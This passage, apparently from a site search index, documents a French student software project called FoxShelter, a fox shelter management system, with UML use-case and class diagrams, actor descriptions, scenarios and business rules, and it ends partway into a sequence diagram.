FoxShelter","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#vue-densemble","title":"Vue d'ensemble","text":"<p>Ce diagramme pr\u00e9sente les diff\u00e9rents cas d'usage du syst\u00e8me FoxShelter, les acteurs impliqu\u00e9s et leurs interactions.</p>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#diagramme-de-cas-dusage","title":"Diagramme de Cas d'Usage","text":"<pre><code>graph TB\n    %% Acteurs\n    subgraph Acteurs\n        V[V\u00e9t\u00e9rinaire]\n        E[Employ\u00e9]\n        B[B\u00e9n\u00e9vole]\n        A[Administrateur]\n        D[Donateur]\n        Ad[Adoptant]\n    end\n\n    %% Syst\u00e8me FoxShelter\n    subgraph \"Syst\u00e8me FoxShelter\"\n        %% Gestion des renards\n        subgraph \"Gestion des Renards\"\n            UC1[Enregistrer nouveau renard]\n            UC2[Consulter fiche renard]\n            UC3[Modifier informations renard]\n            UC4[Marquer renard comme adopt\u00e9]\n            UC5[Rechercher renards]\n            UC6[G\u00e9n\u00e9rer statistiques renards]\n        end\n\n        %% Gestion des soins\n        subgraph \"Gestion des Soins V\u00e9t\u00e9rinaires\"\n            UC7[Programmer soin v\u00e9t\u00e9rinaire]\n            UC8[Effectuer soin v\u00e9t\u00e9rinaire]\n            UC9[Consulter historique soins]\n            UC10[Modifier \u00e9tat de sant\u00e9]\n            UC11[G\u00e9n\u00e9rer rapport m\u00e9dical]\n            UC12[Planifier suivi m\u00e9dical]\n        end\n\n        %% Gestion alimentaire\n        subgraph \"Gestion Alimentaire\"\n            UC13[Cr\u00e9er r\u00e9gime alimentaire]\n            UC14[Assigner r\u00e9gime \u00e0 renard]\n            UC15[Modifier r\u00e9gime alimentaire]\n            UC16[Calculer co\u00fbts alimentaires]\n            UC17[Planifier repas]\n        end\n\n        %% Gestion du personnel\n        subgraph \"Gestion du Personnel\"\n            UC18[Enregistrer employ\u00e9]\n            UC19[Enregistrer b\u00e9n\u00e9vole]\n            UC20[Consulter planning personnel]\n            UC21[Modifier informations personnel]\n            UC22[G\u00e9rer qualifications]\n        end\n\n        %% Gestion des dons\n        subgraph \"Gestion des Dons\"\n            UC23[Enregistrer don]\n            UC24[G\u00e9n\u00e9rer re\u00e7u fiscal]\n            UC25[Suivre dons r\u00e9currents]\n            UC26[Remercier donateurs]\n            UC27[G\u00e9n\u00e9rer rapport financier]\n        end\n\n        %% Gestion des adoptions\n        subgraph \"Gestion des Adoptions\"\n            UC28[Consulter renards adoptables]\n            UC29[Demander adoption]\n            UC30[\u00c9valuer demande adoption]\n            UC31[Finaliser adoption]\n            UC32[Suivre post-adoption]\n        end\n\n        %% Administration\n        subgraph \"Administration\"\n            UC33[G\u00e9rer utilisateurs]\n            UC34[Configurer syst\u00e8me]\n            UC35[Sauvegarder donn\u00e9es]\n            UC36[G\u00e9n\u00e9rer rapports globaux]\n            UC37[G\u00e9rer alertes syst\u00e8me]\n        end\n    end\n\n    %% Relations Acteurs-Cas d'usage\n\n    %% V\u00e9t\u00e9rinaire\n    V --&gt; UC7\n    V --&gt; UC8\n    V --&gt; UC9\n    V --&gt; UC10\n    V --&gt; UC11\n    V --&gt; UC12\n    V --&gt; UC2\n    V --&gt; UC3\n\n    %% Employ\u00e9\n    E --&gt; UC1\n    E --&gt; UC2\n    E --&gt; UC3\n    E --&gt; UC4\n    E --&gt; UC5\n    E --&gt; UC13\n    E --&gt; UC14\n    E --&gt; UC15\n    E --&gt; UC16\n    E --&gt; UC17\n    E --&gt; UC23\n    E --&gt; UC24\n    E --&gt; UC25\n    E --&gt; UC26\n    E --&gt; UC28\n    E --&gt; UC30\n    E --&gt; UC31\n    E --&gt; UC32\n\n    %% B\u00e9n\u00e9vole\n    B --&gt; UC2\n    B --&gt; UC5\n    B --&gt; UC17\n    B --&gt; UC28\n\n    %% Administrateur\n    A --&gt; UC6\n    A --&gt; UC18\n    A --&gt; UC19\n    A --&gt; UC20\n    A --&gt; UC21\n    A --&gt; UC22\n    A --&gt; UC27\n    A --&gt; UC33\n    A --&gt; UC34\n    A --&gt; UC35\n    A --&gt; UC36\n    A --&gt; UC37\n\n    %% Donateur\n    D --&gt; UC23\n    D --&gt; UC25\n\n    %% Adoptant\n    Ad --&gt; UC28\n    Ad --&gt; UC29\n\n    %% Relations entre cas d'usage (include/extend)\n    UC8 -.-&gt;|include| UC10\n    UC4 -.-&gt;|include| UC32\n    UC23 -.-&gt;|extend| UC24\n    UC29 -.-&gt;|include| UC30\n    UC31 -.-&gt;|include| UC4\n    UC11 -.-&gt;|include| UC9\n    UC16 -.-&gt;|include| UC15\n    UC36 -.-&gt;|include| UC6\n    UC36 -.-&gt;|include| UC27\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#description-des-acteurs","title":"Description des Acteurs","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#acteurs-principaux","title":"Acteurs Principaux","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#veterinaire","title":"V\u00e9t\u00e9rinaire","text":"<ul> <li>R\u00f4le : Professionnel de sant\u00e9 animale</li> <li>Responsabilit\u00e9s : </li> <li>Effectuer les soins v\u00e9t\u00e9rinaires</li> <li>Diagnostiquer l'\u00e9tat de sant\u00e9 des renards</li> <li>Planifier les suivis m\u00e9dicaux</li> <li>R\u00e9diger les rapports m\u00e9dicaux</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#employe","title":"Employ\u00e9","text":"<ul> <li>R\u00f4le : Personnel permanent du refuge</li> <li>Responsabilit\u00e9s :</li> <li>Gestion quotidienne des renards</li> <li>Administration des soins de base</li> <li>Gestion des adoptions</li> <li>Gestion des dons et de l'alimentation</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#benevole","title":"B\u00e9n\u00e9vole","text":"<ul> <li>R\u00f4le : Personnel volontaire du refuge</li> <li>Responsabilit\u00e9s :</li> <li>Assistance dans les soins quotidiens</li> <li>Aide \u00e0 l'alimentation</li> <li>Support pour les adoptions</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#administrateur","title":"Administrateur","text":"<ul> <li>R\u00f4le : Gestionnaire du syst\u00e8me et du refuge</li> <li>Responsabilit\u00e9s :</li> <li>Gestion du personnel</li> <li>Configuration du syst\u00e8me</li> <li>G\u00e9n\u00e9ration de rapports</li> <li>Supervision g\u00e9n\u00e9rale</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#acteurs-secondaires","title":"Acteurs Secondaires","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#donateur","title":"Donateur","text":"<ul> <li>R\u00f4le : Personne ou organisation faisant des dons</li> <li>Responsabilit\u00e9s :</li> <li>Effectuer des dons</li> <li>G\u00e9rer les dons r\u00e9currents</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#adoptant","title":"Adoptant","text":"<ul> <li>R\u00f4le : Personne souhaitant adopter un renard</li> <li>Responsabilit\u00e9s :</li> <li>Consulter les renards disponibles</li> <li>Faire une demande d'adoption</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#description-des-cas-dusage","title":"Description des Cas d'Usage","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#gestion-des-renards","title":"Gestion des Renards","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#uc1-enregistrer-nouveau-renard","title":"UC1 - Enregistrer nouveau renard","text":"<ul> <li>Acteur principal : Employ\u00e9</li> <li>Description : Saisir les informations d'un nouveau renard arrivant au refuge</li> <li>Pr\u00e9conditions : Employ\u00e9 authentifi\u00e9</li> <li>Postconditions : Renard enregistr\u00e9 dans le syst\u00e8me</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#uc2-consulter-fiche-renard","title":"UC2 - Consulter fiche renard","text":"<ul> <li>Acteurs : V\u00e9t\u00e9rinaire, Employ\u00e9, B\u00e9n\u00e9vole</li> <li>Description : Afficher les informations d\u00e9taill\u00e9es d'un renard</li> <li>Pr\u00e9conditions : Renard existant dans le syst\u00e8me</li> <li>Postconditions : Informations affich\u00e9es</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#uc4-marquer-renard-comme-adopte","title":"UC4 - Marquer renard comme adopt\u00e9","text":"<ul> <li>Acteur principal : Employ\u00e9</li> <li>Description : Finaliser l'adoption d'un renard</li> <li>Pr\u00e9conditions : Renard adoptable, adoption approuv\u00e9e</li> <li>Postconditions : Renard marqu\u00e9 comme adopt\u00e9, suivi post-adoption initi\u00e9</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#gestion-des-soins-veterinaires","title":"Gestion des Soins V\u00e9t\u00e9rinaires","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#uc8-effectuer-soin-veterinaire","title":"UC8 - Effectuer soin v\u00e9t\u00e9rinaire","text":"<ul> <li>Acteur principal : V\u00e9t\u00e9rinaire</li> <li>Description : R\u00e9aliser un soin m\u00e9dical sur un renard</li> <li>Pr\u00e9conditions : Soin programm\u00e9, v\u00e9t\u00e9rinaire qualifi\u00e9</li> <li>Postconditions : Soin enregistr\u00e9, \u00e9tat de sant\u00e9 mis \u00e0 jour</li> <li>Relations : Include UC10 (Modifier \u00e9tat de sant\u00e9)</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#uc11-generer-rapport-medical","title":"UC11 - G\u00e9n\u00e9rer rapport m\u00e9dical","text":"<ul> <li>Acteur principal : V\u00e9t\u00e9rinaire</li> <li>Description : Cr\u00e9er un rapport m\u00e9dical d\u00e9taill\u00e9 pour un renard</li> <li>Pr\u00e9conditions : Historique de soins disponible</li> <li>Postconditions : Rapport g\u00e9n\u00e9r\u00e9 et sauvegard\u00e9</li> <li>Relations : Include UC9 (Consulter historique soins)</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#gestion-des-adoptions","title":"Gestion des Adoptions","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#uc29-demander-adoption","title":"UC29 - Demander adoption","text":"<ul> <li>Acteur principal : Adoptant</li> <li>Description : Soumettre une demande d'adoption pour un renard</li> <li>Pr\u00e9conditions : Renard disponible \u00e0 l'adoption</li> <li>Postconditions : Demande enregistr\u00e9e pour \u00e9valuation</li> <li>Relations : Include UC30 (\u00c9valuer demande adoption)</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#uc31-finaliser-adoption","title":"UC31 - Finaliser adoption","text":"<ul> <li>Acteur principal : Employ\u00e9</li> <li>Description : Compl\u00e9ter le processus d'adoption</li> <li>Pr\u00e9conditions : Demande approuv\u00e9e, documents sign\u00e9s</li> <li>Postconditions : Adoption finalis\u00e9e, renard transf\u00e9r\u00e9</li> <li>Relations : Include UC4 (Marquer renard comme adopt\u00e9)</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#administration","title":"Administration","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#uc36-generer-rapports-globaux","title":"UC36 - G\u00e9n\u00e9rer rapports globaux","text":"<ul> <li>Acteur principal : Administrateur</li> <li>Description : Cr\u00e9er des rapports de synth\u00e8se sur l'activit\u00e9 du refuge</li> <li>Pr\u00e9conditions : Donn\u00e9es suffisantes dans le syst\u00e8me</li> <li>Postconditions : Rapports g\u00e9n\u00e9r\u00e9s et disponibles</li> <li>Relations : Include UC6 (Statistiques renards), UC27 (Rapport financier)</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#scenarios-principaux","title":"Sc\u00e9narios Principaux","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#scenario-1-arrivee-dun-nouveau-renard","title":"Sc\u00e9nario 1 : Arriv\u00e9e d'un nouveau renard","text":"<ol> <li>Un renard bless\u00e9 est amen\u00e9 au refuge</li> <li>L'employ\u00e9 enregistre le nouveau renard (UC1)</li> <li>Le v\u00e9t\u00e9rinaire examine le renard (UC8)</li> <li>L'\u00e9tat de sant\u00e9 est mis \u00e0 jour (UC10)</li> <li>Un r\u00e9gime alimentaire est assign\u00e9 (UC14)</li> <li>Un suivi m\u00e9dical est planifi\u00e9 (UC12)</li> </ol>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#scenario-2-processus-dadoption","title":"Sc\u00e9nario 2 : Processus d'adoption","text":"<ol> <li>Un adoptant consulte les renards disponibles (UC28)</li> <li>L'adoptant fait une demande d'adoption (UC29)</li> <li>L'employ\u00e9 \u00e9value la demande (UC30)</li> <li>L'adoption est finalis\u00e9e (UC31)</li> <li>Le renard est marqu\u00e9 comme adopt\u00e9 (UC4)</li> <li>Un suivi post-adoption est initi\u00e9 (UC32)</li> </ol>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#scenario-3-suivi-veterinaire","title":"Sc\u00e9nario 3 : Suivi v\u00e9t\u00e9rinaire","text":"<ol> <li>Le v\u00e9t\u00e9rinaire consulte la fiche du renard (UC2)</li> <li>Un soin v\u00e9t\u00e9rinaire est effectu\u00e9 (UC8)</li> <li>L'\u00e9tat de sant\u00e9 est modifi\u00e9 (UC10)</li> <li>Un rapport m\u00e9dical est g\u00e9n\u00e9r\u00e9 (UC11)</li> <li>Le prochain suivi est planifi\u00e9 (UC12)</li> </ol>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#extensions-et-variations","title":"Extensions et Variations","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#extensions-possibles","title":"Extensions possibles","text":"<ul> <li>UC8a : En cas d'urgence, notification imm\u00e9diate du v\u00e9t\u00e9rinaire</li> <li>UC23a : Pour les gros dons, g\u00e9n\u00e9ration automatique de remerciements personnalis\u00e9s</li> <li>UC29a : Si le renard n'est pas adoptable, proposition d'alternatives</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#cas-derreur","title":"Cas d'erreur","text":"<ul> <li>UC1e : Si les informations sont incompl\u00e8tes, demande de compl\u00e9ment</li> <li>UC8e : Si le mat\u00e9riel m\u00e9dical manque, report du soin</li> <li>UC31e : Si les documents sont invalides, annulation de l'adoption</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/#contraintes-et-regles-metier","title":"Contraintes et R\u00e8gles M\u00e9tier","text":"<ol> <li>Seuls les v\u00e9t\u00e9rinaires peuvent effectuer certains soins</li> <li>Un renard ne peut \u00eatre adopt\u00e9 que s'il est en bonne sant\u00e9</li> <li>Les dons doivent \u00eatre valid\u00e9s avant g\u00e9n\u00e9ration de re\u00e7u fiscal</li> <li>Le suivi post-adoption est obligatoire pendant 6 mois</li> <li>Les rapports m\u00e9dicaux doivent \u00eatre sign\u00e9s par un v\u00e9t\u00e9rinaire qualifi\u00e9</li> </ol>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/","title":"Diagramme de Classes UML - FoxShelter","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#vue-densemble","title":"Vue d'ensemble","text":"<p>Ce diagramme pr\u00e9sente la structure des classes principales du syst\u00e8me FoxShelter, leurs relations et leurs responsabilit\u00e9s.</p>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#diagramme-de-classes","title":"Diagramme de Classes","text":"<pre><code>classDiagram\n    %% \u00c9num\u00e9rations\n    class EtatSante {\n        &lt;&lt;enumeration&gt;&gt;\n        Critique\n        Mauvais\n        Moyen\n        Bon\n        Excellent\n    }\n\n    class TypeSoin {\n        &lt;&lt;enumeration&gt;&gt;\n        Consultation\n        Vaccination\n        Chirurgie\n        Urgence\n        Controle\n        Traitement\n        Radiographie\n        AnalyseSanguine\n    }\n\n    class TypeDon {\n        &lt;&lt;enumeration&gt;&gt;\n        Argent\n        Nourriture\n        Materiel\n        Service\n        Medicaments\n        Equipement\n    }\n\n    %% Classes principales\n    class Renard {\n        +int Id\n        +string Nom\n        +string Espece\n        +int Age\n        +char Sexe\n        +DateTime DateArrivee\n        +EtatSante EtatSante\n        +decimal Poids\n        +string Description\n        +bool EstAdopte\n        +int RegimeAlimentaireId\n        +DateTime DateCreation\n        +DateTime DateModification\n\n        +string NomComplet\n        +string SexeTexte\n\n        +int CalculerDureeSejourJours()\n        +bool PeutEtreAdopte()\n        +decimal CalculerCoutTotal()\n        +SoinVeterinaire DernierSoin()\n        +bool NecessiteAttentionUrgente()\n        +string ObtenirAgeAffichage()\n        +void ModifierEtatSante(EtatSante nouvelEtat)\n        +void MarquerCommeAdopte()\n    }\n\n    class Personne {\n        &lt;&lt;abstract&gt;&gt;\n        +int Id\n        +string Nom\n        +string Prenom\n        +string Email\n        +string Telephone\n        +DateTime DateNaissance\n        +string Adresse\n\n        +string NomComplet\n        +string Initiales\n\n        +int CalculerAge()\n        +string ObtenirNomComplet()\n        +bool EstMajeure()\n        +string ObtenirAgeAffichage()\n    }\n\n    class Employe {\n        +decimal Salaire\n        +string Poste\n        +DateTime DateEmbauche\n        +bool EstVeterinaire\n        +string Qualifications\n\n        +int CalculerAncienneteAnnees()\n        +decimal CalculerSalaireAnnuel()\n        +bool PeutEffectuerSoins()\n        +string ObtenirNiveauExperience()\n    }\n\n    class Benevole {\n        +string Disponibilites\n        +string Competences\n        +int HeuresBenevolat\n        +DateTime DatePremiereIntervention\n        +bool EstActif\n        +string Motivation\n\n        +void AjouterHeures(int heures)\n        +bool EstDisponible(DateTime date)\n        +int CalculerDureeEngagementMois()\n        +string ObtenirNiveauImplication()\n    }\n\n    class SoinVeterinaire {\n        +int Id\n        +DateTime DateSoin\n        +TypeSoin TypeSoin\n        +string Description\n        +string Medicaments\n        +decimal Cout\n        +string Observations\n        +DateTime? DateProchaineVisite\n        +bool EstTermine\n        +int VeterinaireId\n        +int RenardId\n\n        +string Resume\n        +int DureeDepuisSoin\n\n        +bool EstUrgent()\n        +bool EstRecent()\n        +bool ASuivi()\n        +bool SuiviEnRetard()\n        +int ObtenirPriorite()\n        +string ObtenirCouleurAffichage()\n        +string ObtenirIcone()\n        +decimal CalculerCoutTotal()\n        +void MarquerCommeTermine()\n        +void ProgrammerSuivi(DateTime date)\n        +string ObtenirResume()\n    }\n\n    class RegimeAlimentaire {\n        +int Id\n        +string Nom\n        +string Description\n        +int FrequenceRepas\n        +decimal QuantiteParRepas\n        +string TypeNourriture\n        +decimal CoutJournalier\n        +string ComplementsAlimentaires\n        +bool AdapteJeunes\n        +bool AdapteAdultes\n        +bool AdapteSeniors\n        +bool EstRegimeMedical\n        +string InstructionsSpeciales\n\n        +decimal QuantiteJournaliere\n        +decimal CoutParKg\n        +string TypeRegime\n\n        +decimal CalculerCoutMensuel()\n        +decimal CalculerCoutAnnuel()\n        +bool EstAdapteAge(int age)\n        +decimal CalculerQuantitePeriode(int jours)\n        +decimal CalculerCoutPeriode(int jours)\n        +List~string~ ObtenirHorairesRepas()\n        +bool NecessiteSurveillance()\n        +string ObtenirRecommandationsAge(int age)\n        +Dictionary~string, object~ GenererPlanningJournalier()\n        +bool ValiderRegime()\n    }\n\n    class Don {\n        +int Id\n        +TypeDon TypeDon\n        +DateTime DateDon\n        +decimal? Montant\n        +string Description\n        +decimal? Quantite\n        +string Unite\n        +string NomDonateur\n        +string PrenomDonateur\n        +string Email\n        +string Telephone\n        +string Adresse\n        +bool EstAnonyme\n        +bool RecuFiscalSouhaite\n        +bool RecuFiscalEnvoye\n        +DateTime? DateEnvoiRecu\n        +string Commentaires\n        +bool EstRecurrent\n        +string FrequenceRecurrence\n        +DateTime? ProchaineEcheance\n        +DateTime DateCreation\n        +DateTime DateModification\n\n        +string DonateurComplet\n        +decimal ValeurEstimee\n        +string StatutRecuFiscal\n        +int Anciennete\n\n        +decimal CalculerValeurMonetaire()\n        +bool NecessiteRecuFiscal()\n        +void MarquerRecuEnvoye()\n        +DateTime CalculerProchaineEcheance()\n        +bool EstEchu()\n        +string ObtenirCategorie()\n        +string GenererMessageRemerciement()\n        +bool ValiderDon()\n        +Don CreerDonRecurrentSuivant()\n    }\n\n    %% Services\n    class RenardService {\n        -FoxShelterContext _context\n\n        +Task~List~Renard~~ ObtenirTousAsync()\n        +Task~Renard~ ObtenirParIdAsync(int id)\n        +Task~Renard~ AjouterAsync(Renard renard)\n        +Task~Renard~ ModifierAsync(Renard renard)\n        +Task~bool~ SupprimerAsync(int id)\n        +Task~List~Renard~~ RechercherAsync(string terme)\n        +Task~Renard~ MarquerCommeAdopteAsync(int id)\n        +Task~Renard~ ModifierEtatSanteAsync(int id, EtatSante nouvelEtat)\n        +Task~StatistiquesRenards~ ObtenirStatistiquesAsync()\n        +Task~List~Renard~~ ObtenirRenardsUrgentsAsync()\n        +Task~List~Renard~~ ObtenirNouveauxArrivantsAsync(int jours)\n        +Task~List~Renard~~ ObtenirRenardsNecessitantSuiviAsync()\n    }\n\n    class StatistiquesRenards {\n        +int NombreTotal\n        +int NombreAdoptes\n        +int NombreUrgents\n        +int NombreNouveauxArrivants\n        +decimal PourcentageAdoptes\n        +decimal CoutMoyenSoins\n        +int DureeSejourMoyenne\n        +Dictionary~EtatSante, int~ RepartitionEtatSante\n        +Dictionary~string, int~ RepartitionEspeces\n    }\n\n    %% Contexte de base de donn\u00e9es\n    class FoxShelterContext {\n        +DbSet~Renard~ Renards\n        +DbSet~Employe~ Employes\n        +DbSet~Benevole~ Benevoles\n        +DbSet~SoinVeterinaire~ SoinsVeterinaires\n        +DbSet~RegimeAlimentaire~ RegimesAlimentaires\n        +DbSet~Don~ Dons\n\n        +void OnModelCreating(ModelBuilder modelBuilder)\n        +Task~int~ SaveChangesAsync()\n    }\n\n    %% Relations\n    Personne &lt;|-- Employe : h\u00e9rite\n    Personne &lt;|-- Benevole : h\u00e9rite\n\n    Renard ||--o{ SoinVeterinaire : \"re\u00e7oit\"\n    Employe ||--o{ SoinVeterinaire : \"effectue\"\n    Renard }o--|| RegimeAlimentaire : \"suit\"\n\n    Renard --&gt; EtatSante : \"a un\"\n    SoinVeterinaire --&gt; TypeSoin : \"est de type\"\n    Don --&gt; TypeDon : \"est de type\"\n\n    RenardService --&gt; FoxShelterContext : \"utilise\"\n    RenardService --&gt; StatistiquesRenards : \"g\u00e9n\u00e8re\"\n\n    FoxShelterContext --&gt; Renard : \"g\u00e8re\"\n    FoxShelterContext --&gt; Employe : \"g\u00e8re\"\n    FoxShelterContext --&gt; Benevole : \"g\u00e8re\"\n    FoxShelterContext --&gt; SoinVeterinaire : \"g\u00e8re\"\n    FoxShelterContext --&gt; RegimeAlimentaire : \"g\u00e8re\"\n    FoxShelterContext --&gt; Don : \"g\u00e8re\"\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#description-des-classes","title":"Description des Classes","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#classes-entites","title":"Classes Entit\u00e9s","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#renard","title":"Renard","text":"<ul> <li>Responsabilit\u00e9 : Repr\u00e9sente un renard h\u00e9berg\u00e9 au refuge</li> <li>Attributs principaux : Informations d'identification, \u00e9tat de sant\u00e9, donn\u00e9es physiques</li> <li>M\u00e9thodes cl\u00e9s : Calculs de dur\u00e9e de s\u00e9jour, v\u00e9rifications d'adoptabilit\u00e9, gestion de l'\u00e9tat</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#personne-abstraite","title":"Personne (Abstraite)","text":"<ul> <li>Responsabilit\u00e9 : Classe de base pour les personnes (employ\u00e9s et b\u00e9n\u00e9voles)</li> <li>Attributs principaux : Informations personnelles de base</li> <li>M\u00e9thodes cl\u00e9s : Calculs d'\u00e2ge, formatage des noms</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#employe","title":"Employe","text":"<ul> <li>Responsabilit\u00e9 : Repr\u00e9sente un employ\u00e9 du refuge</li> <li>Sp\u00e9cialisation : Informations professionnelles, qualifications v\u00e9t\u00e9rinaires</li> <li>M\u00e9thodes cl\u00e9s : Calculs de salaire et d'anciennet\u00e9</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#benevole","title":"Benevole","text":"<ul> <li>Responsabilit\u00e9 : Repr\u00e9sente un b\u00e9n\u00e9vole du refuge</li> <li>Sp\u00e9cialisation : Disponibilit\u00e9s, comp\u00e9tences, suivi de l'engagement</li> <li>M\u00e9thodes cl\u00e9s : Gestion des heures, v\u00e9rification de disponibilit\u00e9</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#soinveterinaire","title":"SoinVeterinaire","text":"<ul> <li>Responsabilit\u00e9 : Repr\u00e9sente un soin v\u00e9t\u00e9rinaire prodigu\u00e9 \u00e0 un renard</li> <li>Attributs principaux : Type de soin, co\u00fbt, observations, suivi</li> <li>M\u00e9thodes cl\u00e9s : \u00c9valuation d'urgence, calculs de co\u00fbt, gestion du suivi</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#regimealimentaire","title":"RegimeAlimentaire","text":"<ul> <li>Responsabilit\u00e9 : D\u00e9finit un r\u00e9gime alimentaire pour les renards</li> <li>Attributs principaux : Composition, fr\u00e9quence, co\u00fbts, adaptabilit\u00e9</li> <li>M\u00e9thodes cl\u00e9s : Calculs nutritionnels et financiers, validation</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#don","title":"Don","text":"<ul> <li>Responsabilit\u00e9 : Repr\u00e9sente un don fait au refuge</li> <li>Attributs principaux : Type, montant, donateur, r\u00e9currence</li> <li>M\u00e9thodes cl\u00e9s : Calculs de valeur, gestion des re\u00e7us fiscaux</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#classes-services","title":"Classes Services","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#renardservice","title":"RenardService","text":"<ul> <li>Responsabilit\u00e9 : Logique m\u00e9tier pour la gestion des renards</li> <li>Fonctionnalit\u00e9s : CRUD, recherche, statistiques, gestion des \u00e9tats</li> <li>Pattern : Service Layer</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#statistiquesrenards","title":"StatistiquesRenards","text":"<ul> <li>Responsabilit\u00e9 : Agr\u00e9gation de donn\u00e9es statistiques</li> <li>Utilisation : Tableaux de bord, rapports</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#classes-infrastructure","title":"Classes Infrastructure","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#foxsheltercontext","title":"FoxShelterContext","text":"<ul> <li>Responsabilit\u00e9 : Contexte Entity Framework pour l'acc\u00e8s aux donn\u00e9es</li> <li>Pattern : Repository/Unit of Work via EF Core</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#patterns-utilises","title":"Patterns Utilis\u00e9s","text":"<ol> <li>H\u00e9ritage : Personne \u2192 Employe/Benevole</li> <li>Composition : Renard contient RegimeAlimentaire</li> <li>Association : Relations entre entit\u00e9s</li> <li>Service Layer : RenardService pour la logique m\u00e9tier</li> <li>Repository Pattern : Via Entity Framework DbContext</li> </ol>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#contraintes-et-regles-metier","title":"Contraintes et R\u00e8gles M\u00e9tier","text":"<ol> <li>Un renard ne peut avoir qu'un seul r\u00e9gime alimentaire actif</li> <li>Seuls les employ\u00e9s v\u00e9t\u00e9rinaires peuvent effectuer certains soins</li> <li>Les soins urgents doivent \u00eatre trait\u00e9s en priorit\u00e9</li> <li>Les r\u00e9gimes m\u00e9dicaux n\u00e9cessitent une surveillance particuli\u00e8re</li> <li>Les dons r\u00e9currents g\u00e9n\u00e8rent automatiquement les \u00e9ch\u00e9ances suivantes</li> </ol>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeClasses/#evolutions-possibles","title":"\u00c9volutions Possibles","text":"<ol> <li>Ajout d'une classe <code>Adoption</code> pour tracer les adoptions</li> <li>Classe <code>Planning</code> pour la gestion des horaires</li> <li>Classe <code>Rapport</code> pour la g\u00e9n\u00e9ration de documents</li> <li>Interface <code>INotificationService</code> pour les alertes</li> <li>Classe <code>Medicament</code> pour une gestion plus fine des traitements</li> </ol>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/","title":"Diagrammes de S\u00e9quence UML - FoxShelter","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#vue-densemble","title":"Vue d'ensemble","text":"<p>Ce document pr\u00e9sente les diagrammes de s\u00e9quence pour les principaux sc\u00e9narios d'utilisation du syst\u00e8me FoxShelter.</p>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#1-diagramme-de-sequence-enregistrement-dun-nouveau-renard","title":"1. Diagramme de S\u00e9quence : Enregistrement d'un nouveau renard","text":"<pre><code>sequenceDiagram\n    participant E as Employ\u00e9\n    participant C as RenardController\n    participant S as RenardService\n    participant DB as FoxShelterContext\n  